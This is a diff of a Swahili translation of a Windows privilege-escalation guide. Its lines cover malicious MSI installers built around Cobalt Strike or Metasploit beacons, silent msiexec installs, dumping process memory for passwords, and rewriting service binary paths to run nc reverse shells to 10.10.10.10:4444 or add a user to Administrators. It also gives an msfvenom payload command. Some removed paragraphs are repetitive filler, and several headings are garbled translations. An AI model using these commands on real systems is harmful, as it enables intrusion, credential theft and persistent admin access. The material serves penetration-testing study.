+Tumia amri `Write-UserAddMSI` kutoka kwa power-up ili kuunda ndani ya saraka ya sasa faili ya Windows MSI ili kuinua mamlaka. Skripti hii huiandika nje mfasilishaji wa MSI uliopangwa mapema ambao unauliza kuongeza mtumiaji/kikundi (hivyo utahitaji ufikivu wa GIU):
 ```
 Write-UserAddMSI
 ```
-Chukua faili iliyoundwa na uitekeleze ili kuongeza mamlaka.
+### Kutekeleza
 
-### Mfuko wa MSI
+Chapisha faili iliyoundwa ili kuboresha mamlaka.
 
-Soma mafunzo haya ili kujifunza jinsi ya kuunda mfuko wa MSI kwa kutumia zana hii. Kumbuka kuwa unaweza kufunga faili ya "**.bat**" ikiwa unataka tu kutekeleza mistari ya amri.
+### MSI Wrapper
+
+Soma mafunzo haya kujifunza jinsi ya kuunda kifuniko cha MSI kutumia zana hii. Tafadhali kumbuka unaweza kufunika faili ya "**.bat**" ikiwa unataka **kutekeleza** **mistari ya amri** **tu**
 
 {% content-ref url="msi-wrapper.md" %}
 [msi-wrapper.md](msi-wrapper.md)
@@ -400,44 +242,44 @@ Soma mafunzo haya ili kujifunza jinsi ya kuunda mfuko wa MSI kwa kutumia zana hi
 
 ### Unda MSI na Visual Studio
 
-* **Tengeneza** na Cobalt Strike au Metasploit **malipo ya TCP ya Windows EXE mpya** katika `C:\privesc\beacon.exe`
-* Fungua **Visual Studio**, chagua **Tengeneza mradi mpya** na andika "installer" katika sanduku la utaftaji. Chagua mradi wa **Mchawi wa Usanidi** na bonyeza **Next**.
-* Wapa mradi jina, kama vile **AlwaysPrivesc**, tumia **`C:\privesc`** kwa eneo, chagua **weka suluhisho na mradi katika saraka moja**, na bonyeza **Unda**.
-* Endelea bonyeza **Next** hadi ufikie hatua ya 3 kati ya 4 (chagua faili za kuingiza). Bonyeza **Ongeza** na chagua malipo ya Beacon uliyounda tu. Kisha bonyeza **Maliza**.
-* Weka mradi wa **AlwaysPrivesc** katika **Explorer ya Suluhisho** na katika **Mali**, badilisha **Lengo la Jukwaa** kutoka **x86** hadi **x64**.
-* Kuna mali zingine unaweza kubadilisha, kama vile **Mwandishi** na **Mzalishaji** ambayo inaweza kufanya programu iliyosanikishwa ionekane halali zaidi.
-* Bonyeza kulia kwenye mradi na chagua **Angalia > Vitendo Maalum**.
-* Bonyeza kulia **Sakinisha** na chagua **Ongeza Hatua Maalum**.
-* Bonyeza mara mbili kwenye **Folda ya Programu**, chagua faili yako ya **beacon.exe** na bonyeza **Sawa**. Hii itahakikisha kuwa malipo ya beacon yanatekelezwa mara tu usanidi unapoendeshwa.
-* Chini ya **Mali za Hatua Maalum**, badilisha **Run64Bit** kuwa **Sahihi**.
+* **Zalisha** na Cobalt Strike au Metasploit **Windows EXE TCP payload** mpya katika `C:\privesc\beacon.exe`
+* Fungua **Visual Studio**, chagua **Unda mradi mpya** na andika "msakinishaji" kwenye sanduku la utaftaji. Chagua mradi wa **Mchawi wa Usanidi** na bonyeza **Next**.
+* Toa jina kwa mradi, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kwa eneo, chagua **weka suluhisho na mradi katika saraka moja**, na bonyeza **Unda**.
+* Endelea kubonyeza **Next** hadi ufike hatua 3 kati ya 4 (chagua faili za kujumuisha). Bonyeza **Ongeza** na chagua mzigo wa Beacon uliounda. Kisha bonyeza **Maliza**.
+* Weka mstari wa **AlwaysPrivesc** katika **Mtafutaji wa Suluhisho** na katika **Mali**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
+* Kuna mali zingine unaweza kubadilisha, kama **Mwandishi** na **Mzalishaji** ambayo inaweza kufanya programu iliyosakinishwa ionekane halali zaidi.
+* Bonyeza kulia kwenye mradi na chagua **Tazama > Vitendo vya Desturi**.
+* Bonyeza kulia **Sakinisha** na chagua **Ongeza Hatua ya Desturi**.
+* Bonyeza mara mbili kwenye **Folda ya Maombi**, chagua faili yako ya **beacon.exe** na bonyeza **Sawa**. Hii itahakikisha kuwa mzigo wa beacon unatekelezwa mara tu msakinishaji unapoendeshwa.
+* Chini ya **Mali za Hatua ya Desturi**, badilisha **Run64Bit** kuwa **Sahihi**.
 * Hatimaye, **ijenge**.
-* Ikiwa onyo `Faili 'beacon-tcp.exe' inayolenga 'x64' haiwezi kufanya kazi na jukwaa la lengo la mradi 'x86'` inaonyeshwa, hakikisha umeweka jukwaa kuwa x64.
+* Ikiwa onyo `Faili 'beacon-tcp.exe' ikilenga 'x64' sio sambamba na jukwaa la lengo la mradi 'x86'` linaonyeshwa, hakikisha umeweka jukwaa kuwa x64.
 
-### Usanikishaji wa MSI
+### Usakinishaji wa MSI
 
-Ili kutekeleza **usanikishaji** wa faili ya `.msi` yenye nia mbaya **kwa siri:**
+Kutekeleza **usakinishaji** wa faili ya `.msi` yenye nia mbaya **kwa siri:**
 ```
 msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
 ```
 Kutumia udhaifu huu unaweza kutumia: _exploit/windows/local/always\_install\_elevated_
 
-## Antivirus na Detectors
+## Programu ya Kupambana na Virusi na Detectors
 
 ### Mipangilio ya Ukaguzi
 
-Mipangilio hii inaamua ni nini kinachopokelewa **kwenye kumbukumbu**, hivyo unapaswa kuwa makini
+Mipangilio hii inaamua ni nini kinachopigwa **kumbukumbu**, hivyo unapaswa kutilia maanani
 ```
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
 ```
 ### WEF
 
-Windows Event Forwarding, ni muhimu kujua wapi kumbukumbu zinatumwa.
+Windows Event Forwarding, ni muhimu kujua wapi zinapelekwa kumbukumbu.
 ```bash
 reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
 ```
 ### LAPS
 
-**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Msimamizi wa Mitaa**, ikihakikisha kuwa kila nywila ni **ya kipekee, imechanganywa, na inasasishwa mara kwa mara** kwenye kompyuta zilizounganishwa kwenye kikoa. Nywila hizi zimehifadhiwa salama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji ambao wamepewa ruhusa ya kutosha kupitia ACLs, kuruhusu kuona nywila za msimamizi wa mitaa ikiwa wameruhusiwa.
+**LAPS** imeundwa kwa **usimamizi wa nywila za Wasimamizi wa Mitaa**, ikihakikisha kuwa kila nywila ni **ya kipekee, imechanganywa, na updated mara kwa mara** kwenye kompyuta zilizounganishwa kwenye kikoa. Nywila hizi zimehifadhiwa kwa usalama ndani ya Active Directory na zinaweza kupatikana tu na watumiaji ambao wamepewa ruhusa za kutosha kupitia ACLs, kuwaruhusu kuona nywila za wasimamizi wa mitaa ikiwa wameruhusiwa.
 
 {% content-ref url="../active-directory-methodology/laps.md" %}
 [laps.md](../active-directory-methodology/laps.md)
@@ -446,36 +288,35 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 ### WDigest
 
 Ikiwa imeamilishwa, **nywila za maandishi wazi zimehifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
-[**Maelezo zaidi kuhusu WDigest katika ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).
+[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).
 ```bash
 reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
 ```
-### Ulinzi wa LSA
+### Kinga ya LSA
 
-Kuanzia **Windows 8.1**, Microsoft iliingiza ulinzi ulioboreshwa kwa Mamlaka ya Usalama wa Ndani (LSA) ili **kuzuia** jaribio la michakato isiyotegemewa kusoma kumbukumbu yake au kuingiza namna ya programu, kuimarisha zaidi mfumo.\
-[**Maelezo zaidi kuhusu Ulinzi wa LSA hapa**](../stealing-credentials/credentials-protections.md#ulinzi-wa-lsa).
+Kuanzia **Windows 8.1**, Microsoft iliingiza kinga iliyoboreshwa kwa Mamlaka ya Usalama wa Ndani (LSA) ili **kuzuia** jaribio la michakato isiyosadikika **kusoma kumbukumbu yake** au kuingiza nambari, ikilinda mfumo zaidi.\
+[**Maelezo zaidi kuhusu Kinga ya LSA hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).
 ```bash
 reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
 ```
 ### Mlinzi wa Vitambulisho
 
-**Mlinzi wa Vitambulisho** uliingizwa katika **Windows 10**. Lengo lake ni kulinda vitambulisho vilivyohifadhiwa kwenye kifaa dhidi ya vitisho kama mashambulizi ya pass-the-hash.
-[**Maelezo zaidi kuhusu Mlinzi wa Vitambulisho hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)
+**Mlinzi wa Vitambulisho** uliingizwa katika **Windows 10**. Lengo lake ni kulinda vitambulisho vilivyohifadhiwa kwenye kifaa dhidi ya vitisho kama mashambulizi ya pass-the-hash.| [**Maelezo zaidi kuhusu Mlinzi wa Vitambulisho hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)
 ```bash
 reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
 ```
-### Vitambulisho Vilivyohifadhiwa
+### Maelezo ya Mipokezi Iliyohifadhiwa
 
-**Vitambulisho vya kikoa** huthibitishwa na **Mamlaka ya Usalama wa Ndani** (LSA) na hutumiwa na sehemu za mfumo wa uendeshaji. Wakati data ya kuingia ya mtumiaji inathibitishwa na kifurushi cha usalama kilichosajiliwa, kwa kawaida vitambulisho vya kikoa kwa mtumiaji huwekwa.\
-[**Maelezo zaidi kuhusu Vitambulisho Vilivyohifadhiwa hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).
+**Mipokezi ya kikoa** huthibitishwa na **Mamlaka ya Usalama ya Ndani** (LSA) na hutumiwa na vipengele vya mfumo wa uendeshaji. Wakati data ya kuingia ya mtumiaji inathibitishwa na pakiti ya usalama iliyosajiliwa, kawaida mipokezi ya kikoa kwa mtumiaji huanzishwa.\
+[**Maelezo zaidi kuhusu Mipokezi Iliyohifadhiwa hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).
 ```bash
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
 ```
-## Watumiaji na Vikundi
+## Watumiaji & Vikundi
 
-### Kuchunguza Watumiaji na Vikundi
+### Kuchunguza Watumiaji & Vikundi
 
-Unapaswa kuchunguza ikiwa kuna vikundi ambavyo unahusika navyo na vinayo ruhusa za kuvutia.
+Unapaswa kuchunguza ikiwa kuna kikundi chochote ambacho unahusika nacho kina ruhusa za kuvutia
 ```bash
 # CMD
 net users %username% #Me
@@ -490,77 +331,47 @@ Get-LocalUser | ft Name,Enabled,LastLogon
 Get-ChildItem C:\Users -Force | select Name
 Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```
-### Vikundi vya wenye mamlaka
+### Vikundi vya Kuheshimiwa
 
-Ikiwa **unaingia kwenye kikundi cha wenye mamlaka unaweza kuongeza mamlaka**. Jifunze kuhusu vikundi vya wenye mamlaka na jinsi ya kuvitumia kwa kuongeza mamlaka hapa:
+Ikiwa **unaingia katika kikundi cha kuheshimiwa unaweza kuinua** upendeleo. Jifunze kuhusu vikundi vya kuheshimiwa na jinsi ya kuvitumia kwa kusudi la kuinua upendeleo hapa:
 
 {% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
 [privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
 {% endcontent-ref %}
 
-### Usindikaji wa alama
+### Ujanja wa Token
 
-**Jifunze zaidi** kuhusu nini ni **alama** kwenye ukurasa huu: [**Alama za Windows**](../authentication-credentials-uac-and-efs.md#access-tokens).\
-Angalia ukurasa ufuatao ili **kujifunza kuhusu alama za kuvutia** na jinsi ya kuzitumia vibaya:
+**Jifunze zaidi** kuhusu ni nini **token** katika ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs.md#access-tokens).\
+Angalia ukurasa ufuatao kujifunza kuhusu token za kuvutia na jinsi ya kuzitumia vibaya:
 
 {% content-ref url="privilege-escalation-abusing-tokens/" %}
 [privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
 {% endcontent-ref %}
 
-### Watumiaji walioingia / Vikao
+### Watumiaji Walioingia / Vikao
 ```bash
 qwinsta
 klist sessions
 ```
-### Makabrasha ya Nyumbani
-
-Makabrasha ya nyumbani ni maeneo ambapo watumiaji wa mfumo wa Windows hufanya kazi na kuhifadhi faili zao za kibinafsi. Kila mtumiaji ana kabrasha lake la nyumbani ambalo linapatikana chini ya folda ya "C:\Users" kwa mfumo wa Windows 7 na "C:\Documents and Settings" kwa mfumo wa Windows XP.
-
-Kwa kawaida, makabrasha ya nyumbani yana kinga ya usalama ili kuzuia upatikanaji usioidhinishwa. Hata hivyo, kuna njia kadhaa za kukiuka kinga hii na kupata ufikiaji wa kiwango cha juu kwenye mfumo.
-
-Moja ya njia hizo ni kuchunguza faili za usanidi wa programu zinazotumiwa na watumiaji. Mara nyingi, faili hizi zina habari muhimu kama vile nywila zilizohifadhiwa kwa njia isiyofaa. Kwa kuchunguza faili hizi, unaweza kupata ufikiaji wa kiwango cha juu kwenye mfumo.
-
-Njia nyingine ni kuchunguza faili za usanidi wa programu zinazotumiwa na watumiaji. Mara nyingi, faili hizi zina habari muhimu kama vile nywila zilizohifadhiwa kwa njia isiyofaa. Kwa kuchunguza faili hizi, unaweza kupata ufikiaji wa kiwango cha juu kwenye mfumo.
-
-Kwa kumalizia, makabrasha ya nyumbani ni maeneo muhimu ya kuchunguza wakati wa kutekeleza mbinu za kuboresha ufikiaji wa kiwango cha juu kwenye mfumo wa Windows. Kwa kuchunguza faili za usanidi na kufanya uchunguzi wa kina, unaweza kupata habari muhimu na kukiuka kinga ya usalama ili kupata ufikiaji wa kiwango cha juu.
+### Vyeo vya Nyumbani
 ```powershell
 dir C:\Users
 Get-ChildItem C:\Users
 ```
-### Sera ya Nenosiri
-
-Kuna sera ya nenosiri ambayo inaweza kuwekwa kwenye mfumo wa Windows ili kuimarisha usalama. Sera hii inahusisha vigezo na mahitaji ambayo lazima yafuatwe wakati wa kuunda na kutumia nywila kwenye mfumo.
-
-Sera ya nenosiri inaweza kujumuisha mambo kama vile urefu wa neno la siri, matumizi ya herufi kubwa na ndogo, nambari, na alama maalum. Pia inaweza kuweka kikomo cha muda wa kubadilisha nywila na kuzuia matumizi ya nywila zilizotumiwa hapo awali.
-
-Kwa kuweka sera ya nenosiri yenye nguvu, unaweza kuzuia mashambulizi ya kubadilisha nywila na kuongeza usalama wa mfumo wako wa Windows. Ni muhimu kuhakikisha kuwa sera hii inatekelezwa na kufuatwa na watumiaji wote wa mfumo.
+### Sera ya Nywila
 ```bash
 net accounts
 ```
 ### Pata maudhui ya ubao wa kunakili
-
-Kuna njia kadhaa za kupata maudhui ya ubao wa kunakili kwenye mfumo wa Windows. Hapa kuna njia mbili za kufanya hivyo:
-
-1. Kutumia programu ya PowerShell:
-   - Fungua PowerShell kama msimamizi.
-   - Tumia amri ifuatayo: `Get-Clipboard`.
-   - Maudhui ya ubao wa kunakili yataonyeshwa kwenye dirisha la PowerShell.
-
-2. Kutumia programu ya Command Prompt:
-   - Fungua Command Prompt kama msimamizi.
-   - Tumia amri ifuatayo: `clip`.
-   - Maudhui ya ubao wa kunakili yatapelekwa kwenye dirisha la Command Prompt.
-
-Kwa njia hizi, unaweza kupata maudhui ya ubao wa kunakili kwenye mfumo wa Windows.
 ```bash
 powershell -command "Get-Clipboard"
 ```
-## Kukimbia Mchakato
+## Mchakato wa Kufanya Kazi
 
-### Ruhusa za Faili na Folda
+### Mamlaka ya Faili na Folda
 
 Kwanza kabisa, orodhesha mchakato **angalia nywila ndani ya mstari wa amri ya mchakato**.\
-Angalia ikiwa unaweza **kubadilisha faili ya kukimbia** au ikiwa una ruhusa ya kuandika kwenye folda ya faili ili kutumia [mashambulizi ya **DLL Hijacking**](dll-hijacking.md):
+Angalia kama unaweza **kubadilisha baadhi ya faili zinazoendeshwa** au kama una ruhusa ya kuandika kwenye folda ya faili ili kutumia [**mashambulizi ya DLL Hijacking**](dll-hijacking.md):
 ```bash
 Tasklist /SVC #List processes running and services
 tasklist /v /fi "username eq system" #Filter "system" processes
@@ -571,7 +382,7 @@ Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "sv
 #Without usernames
 Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
 ```
-Hakikisha daima kuna [**wadukuzi wa electron/cef/chromium** inayofanya kazi, unaweza kuitumia kwa kuboresha mamlaka](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).
+Hakikisha kila wakati kuna [**wadukuzi wa electron/cef/chromium** wanaofanya kazi, unaweza kuitumia kwa kujipandisha viwango vya ruhusa](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).
 
 **Kuangalia ruhusa za faili za michakato**
 ```bash
@@ -582,7 +393,7 @@ icacls "%%z"
 )
 )
 ```
-**Kuangalia ruhusa za folda za mchakato wa faili za binary (**[**DLL Hijacking**](dll-hijacking.md)**)**
+**Kuangalia ruhusa za folda za mchakato wa binaries (**[**DLL Hijacking**](dll-hijacking.md)**)**
 ```bash
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
 "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
@@ -590,17 +401,17 @@ icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone
 todos %username%" && echo.
 )
 ```
-### Uchimbaji wa Nywila za Kumbukumbu
+### Kuchimba Nywila za Kumbukumbu
 
-Unaweza kuunda kumbukumbu ya kumbukumbu ya mchakato unaofanya kazi kwa kutumia **procdump** kutoka kwa sysinternals. Huduma kama FTP zina **nywila wazi katika kumbukumbu**, jaribu kuchimba kumbukumbu na kusoma nywila.
+Unaweza kuunda kumbukumbu ya mchakato unaoendelea kutumia **procdump** kutoka kwa sysinternals. Huduma kama FTP ina **nywila wazi kwenye kumbukumbu**, jaribu kuchimba kumbukumbu na kusoma nywila.
 ```bash
 procdump.exe -accepteula -ma <proc_name_tasklist>
 ```
 ### Programu za GUI zisizo salama
 
-**Programu zinazofanya kazi kama SYSTEM zinaweza kuruhusu mtumiaji kuzindua CMD, au kuvinjari folda.**
+**Programu zinazoendeshwa kama SYSTEM zinaweza kuruhusu mtumiaji kuanzisha CMD, au kutazama folda.**
 
-Mfano: "Msaada na Usaidizi wa Windows" (Windows + F1), tafuta "amri ya amri", bonyeza "Bonyeza ili kufungua Amri ya Amri"
+Mfano: "Msaada na Usaidizi wa Windows" (Windows + F1), tafuta "amri ya amri", bofya "Bonyeza kufungua Amri ya Amri"
 
 ## Huduma
 
@@ -611,17 +422,17 @@ wmic service list brief
 sc query
 Get-Service
 ```
-### Vibali
+### Ruhusa
 
-Unaweza kutumia **sc** kupata habari za huduma
+Unaweza kutumia **sc** kupata habari ya huduma
 ```bash
 sc qc <service_name>
 ```
-Inapendekezwa kuwa na faili ya binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha ruhusa kinachohitajika kwa kila huduma.
+Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuchunguza kiwango cha ruhusa kinachohitajika kwa kila huduma.
 ```bash
 accesschk.exe -ucqv <Service_Name> #Check rights for different groups
 ```
-Inashauriwa kuangalia ikiwa "Watumiaji waliothibitishwa" wanaweza kurekebisha huduma yoyote:
+Ni vyema kuhakikisha ikiwa "Watumiaji Waliothibitishwa" wanaweza kuhariri huduma yoyote:
 ```bash
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 accesschk.exe -uwcqv %USERNAME% * /accepteula
@@ -630,27 +441,27 @@ accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 ```
 [Unaweza kupakua accesschk.exe kwa XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)
 
-### Kuwezesha huduma
+### Wezesha huduma
 
 Ikiwa una kosa hili (kwa mfano na SSDPSRV):
 
-_Kosa la mfumo 1058 limetokea._\
-_Huduma haiwezi kuanza, au kwa sababu imelemazwa au kwa sababu haina vifaa vilivyowezeshwa vinavyohusiana nayo._
+_ Kosa la mfumo 1058 limejitokeza._\
+_ Huduma haiwezi kuanzishwa, ama kwa sababu imelemazwa au kwa sababu haina vifaa vilivyowezeshwa vinavyohusiana nayo._
 
 Unaweza kuwezesha kwa kutumia
 ```bash
 sc config SSDPSRV start= demand
 sc config SSDPSRV obj= ".\LocalSystem" password= ""
 ```
-**Tafadhali kumbuka kuwa huduma ya upnphost inategemea SSDPSRV ili kufanya kazi (kwa XP SP1)**
+**Chukua kumbuka kwamba huduma ya upnphost inategemea SSDPSRV kufanya kazi (kwa XP SP1)**
 
-**Njia nyingine ya kuzunguka** tatizo hili ni kwa kukimbia:
+**Mbinu nyingine** ya tatizo hili ni kukimbia:
 ```
 sc.exe config usosvc start= auto
 ```
-### **Badilisha njia ya faili ya huduma**
+### **Badilisha njia ya binary ya huduma**
 
-Katika hali ambapo kikundi cha "Watumiaji waliothibitishwa" kinamiliki **SERVICE_ALL_ACCESS** kwenye huduma, inawezekana kubadilisha njia ya faili ya huduma. Ili kubadilisha na kutekeleza **sc**:
+Katika hali ambapo kikundi cha "Watumiaji waliothibitishwa" wanamiliki **SERVICE\_ALL\_ACCESS** kwenye huduma, ubadilishaji wa binary ya kutekelezeka ya huduma ni wa kufanyika. Ili kubadilisha na kutekeleza **sc**:
 ```bash
 sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
 sc config <Service_Name> binpath= "net localgroup administrators username /add"
@@ -658,40 +469,25 @@ sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cm
 
 sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
 ```
-### Anzisha tena huduma
-
-Ili kuanzisha tena huduma, unaweza kutumia amri ifuatayo:
-
-```bash
-net stop <huduma>
-net start <huduma>
-```
-
-Badilisha `<huduma>` na jina la huduma unayotaka kuanzisha tena. Kwa mfano, ikiwa unataka kuanzisha tena huduma ya "Print Spooler", unaweza kutumia amri zifuatazo:
-
-```bash
-net stop Spooler
-net start Spooler
-```
-
-Hii itasababisha huduma kusimamishwa kwanza na kisha kuanzishwa tena.
+### Anza upya huduma
 ```bash
 wmic service NAMEOFSERVICE call startservice
 net stop [service name] && net start [service name]
 ```
-Uwezo unaweza kuongezeka kupitia idhini mbalimbali:
-- **SERVICE_CHANGE_CONFIG**: Inaruhusu upya mipangilio ya faili ya huduma.
-- **WRITE_DAC**: Inawezesha upya idhini, hivyo kuwezesha kubadilisha mipangilio ya huduma.
-- **WRITE_OWNER**: Inaruhusu umiliki na upya idhini.
-- **GENERIC_WRITE**: Inarithi uwezo wa kubadilisha mipangilio ya huduma.
-- **GENERIC_ALL**: Pia inarithi uwezo wa kubadilisha mipangilio ya huduma.
+Mamlaka zinaweza kuongezeka kupitia idhini mbalimbali:
 
-Kwa ajili ya kugundua na kutumia udhaifu huu, unaweza kutumia _exploit/windows/local/service_permissions_.
+* **SERVICE\_CHANGE\_CONFIG**: Inaruhusu upyaishaji wa faili ya huduma.
+* **WRITE\_DAC**: Inawezesha upyaishaji wa idhini, ikiongoza kwa uwezo wa kubadilisha mipangilio ya huduma.
+* **WRITE\_OWNER**: Inaruhusu kupata umiliki na upyaishaji wa idhini.
+* **GENERIC\_WRITE**: Inarithi uwezo wa kubadilisha mipangilio ya huduma.
+* **GENERIC\_ALL**: Pia inarithi uwezo wa kubadilisha mipangilio ya huduma.
 
-### Idhini dhaifu za faili za huduma
+Kwa kugundua na kutumia udhaifu huu, _exploit/windows/local/service\_permissions_ inaweza kutumika.
 
-**Angalia kama unaweza kubadilisha faili inayotekelezwa na huduma** au kama una **idhini ya kuandika kwenye folda** ambapo faili inapatikana ([**DLL Hijacking**](dll-hijacking.md))**.**\
-Unaweza kupata kila faili inayotekelezwa na huduma kwa kutumia **wmic** (siyo katika system32) na angalia idhini zako kwa kutumia **icacls**:
+### Mamlaka dhaifu za faili za huduma
+
+**Angalia ikiwa unaweza kuhariri faili ya kutekelezwa na huduma** au ikiwa una **idhini ya kuandika kwenye folda** ambapo faili ya kutekelezwa iko ([**DLL Hijacking**](dll-hijacking.md))**.**\
+Unaweza kupata kila faili ya kutekelezwa na huduma kwa kutumia **wmic** (siyo katika system32) na angalia idhini zako kwa kutumia **icacls**:
 ```bash
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
 
@@ -703,10 +499,9 @@ sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
 FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 ```
-### Huduma za mabadiliko ya ruhusa ya usajili
+### Mamlaka ya Kubadilisha Usajili wa Huduma
 
-Unapaswa kuhakiki ikiwa unaweza kubadilisha usajili wa huduma yoyote.\
-Unaweza **kuchunguza** ruhusa zako za **kubadilisha** usajili wa huduma kwa kufanya:
+Unapaswa kuangalia ikiwa unaweza kubadilisha usajili wa huduma yoyote. Unaweza **kuangalia** mamlaka yako juu ya usajili wa huduma kwa kufanya:
 ```bash
 reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
 
@@ -715,31 +510,31 @@ for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\
 
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
 ```
-Inapaswa kuhakikiwa ikiwa **Watumiaji waliothibitishwa** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa ndivyo, faili ya kutekelezwa na huduma inaweza kubadilishwa.
+Ni vyema kuhakikisha kwamba **Watumiaji Waliothibitishwa** au **NT AUTHORITY\INTERACTIVE** wanamiliki ruhusa za `FullControl`. Ikiwa ndivyo, faili ya binary inayotekelezwa na huduma inaweza kubadilishwa.
 
-Kubadilisha Njia ya faili ya kutekelezwa:
+Kubadilisha Njia ya faili ya binary inayotekelezwa:
 ```bash
 reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
 ```
-### Huduma za Usajili wa AppendData/AddSubdirectory
+### Huduma ya ruhusa ya Usajili wa Huduma ya AppendData/AddSubdirectory
 
-Ikiwa una ruhusa hii juu ya usajili, inamaanisha **unaweza kuunda usajili wa chini kutoka kwa huu**. Katika kesi ya huduma za Windows hii ni **ya kutosha kutekeleza nambari ya aina yoyote:**
+Ikiwa una ruhusa hii juu ya usajili hii inamaanisha **unaweza kuunda usajili wa chini kutoka kwa huu**. Kwa huduma za Windows hii ni **ya kutosha kutekeleza nambari ya kupindukia:**
 
 {% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
 [appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
 {% endcontent-ref %}
 
-### Njia za Huduma Zisizo na Alama
+### Njia za Huduma zisizowekwa kwenye Alama
 
-Ikiwa njia ya faili ya kutekelezwa haijatambulishwa kwa alama, Windows itajaribu kutekeleza kila sehemu kabla ya nafasi.
+Ikiwa njia ya kutekelezwa haipo ndani ya alama, Windows itajaribu kutekeleza kila mwisho kabla ya nafasi.
 
-Kwa mfano, kwa njia ya _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
+Kwa mfano, kwa njia _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
 ```powershell
 C:\Program.exe
 C:\Program Files\Some.exe
 C:\Program Files\Some Folder\Service.exe
 ```
-Orodhesha njia zote za huduma zisizo na nukuu, isipokuwa zile zinazomilikiwa na huduma za kujengwa za Windows:
+### Orodhesha njia zote za huduma ambazo hazijatajwa, isipokuwa zile zinazomilikiwa na huduma za Windows zilizojengwa:
 ```bash
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
 wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services
@@ -755,20 +550,19 @@ echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s &&
 ```bash
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
-**Unaweza kugundua na kutumia** udhaifu huu na metasploit: `exploit/windows/local/trusted\_service\_path`
-Unaweza kuunda faili ya huduma kwa mkono na metasploit:
+**Unaweza kugundua na kutumia** udhaifu huu na metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda binary ya huduma kwa mkono na metasploit:
 ```bash
 msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
 ```
 ### Hatua za Kurejesha
 
